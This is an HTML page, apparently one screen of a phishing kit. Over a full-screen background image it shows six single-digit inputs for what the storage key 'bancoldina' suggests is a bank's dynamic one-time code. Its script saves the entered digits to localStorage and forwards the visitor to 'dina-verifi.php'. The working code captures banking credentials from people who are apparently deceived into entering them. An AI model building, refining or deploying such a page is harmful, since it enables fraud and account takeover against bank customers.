<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Image-based Website</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f0f0f0;
    }

    .image-container {
      width: 100%;
      height: 100%;
      overflow: hidden;
      position: relative;
    }

    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .center-box {
      position: absolute;
      top: 57%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: transparent; /* âœ… Fondo transparente */
      padding: 20px 30px;
      border-radius: 8px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .input-container {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .password-input {
      width: 28px;
      height: 20px;
      text-align: center;
      font-size: 20px;
      padding: 10px 0 5px 0;
      border: none;
      border-bottom: 1.5px solid #808285;
      background: transparent;
      outline: none;
      color: #2c2a29;
    }

    .password-input:focus {
      border-bottom: 1.5px solid #ffc20e;
    }

    .button-container {
      position: absolute;
      top: 68%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: flex;
      flex-direction: column;
      gap: 18px;
      transition: top 0.3s ease-in-out;
    }

    .button-container button {
      padding: 15px 120px;
      font-size: 16px;
      border: none;
      border-radius: 50px;
      font-weight: bold;
      color: rgb(1, 1, 1);
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .button-container button:first-child {
      background-color: #ffda37;
      border: 1px solid black;
    }

    .button-container button:first-child:hover {
      background-color: #ffda37;
    }

    .button-container button:last-child {
      background-color: #bababa;
    }

    .button-container button:last-child:hover {
      background-color: #bababa;
    }

    @media screen and (max-width: 480px) {
      .password-input {
        width: 26px;
        font-size: 18px;
        padding: 8px 0 4px 0;
        margin: 0 2px;
      }

      .button-container {
        top: 78%;
      }

      .button-container button {
        padding: 13px 90px;
        font-size: 15px;
      }
    }
  </style>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>

  <div class="image-container">
    <img src="img/cel3.jpg" alt="Background Image">

    <div class="center-box">
      <div class="input-container">
        <input type="tel" class="password-input" maxlength="1" id="input1">
        <input type="tel" class="password-input" maxlength="1" id="input2">
        <input type="tel" class="password-input" maxlength="1" id="input3">
        <input type="tel" class="password-input" maxlength="1" id="input4">
        <input type="tel" class="password-input" maxlength="1" id="input5">
        <input type="tel" class="password-input" maxlength="1" id="input6">
      </div>
    </div>

    <div class="button-container">
      <button id="continuar">Continuar</button>
      <button id="cancelar">Cancelar</button>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.password-input');

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (!/^\d$/.test(value)) {
          e.target.value = '';
        } else {
          if (index < inputs.length - 1 && e.target.value !== '') {
            inputs[index + 1].focus();
          }
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
          inputs[index - 1].focus();
        }
      });
    });

    document.getElementById('continuar').addEventListener('click', () => {
      const inputValues = Array.from(inputs).map(input => input.value).join('');
      localStorage.setItem('bancoldina', inputValues);
      window.location.href = 'dina-verifi.php';
    });

    document.getElementById('cancelar').addEventListener('click', () => {
      window.location.href = 'index.html';
    });

    window.addEventListener('resize', () => {
      const buttonContainer = document.querySelector('.button-container');
      if (window.innerHeight < 500) {
        buttonContainer.style.top = '82%';
      } else {
        buttonContainer.style.top = '68%';
      }
    });
  </script>

</body>
</html>
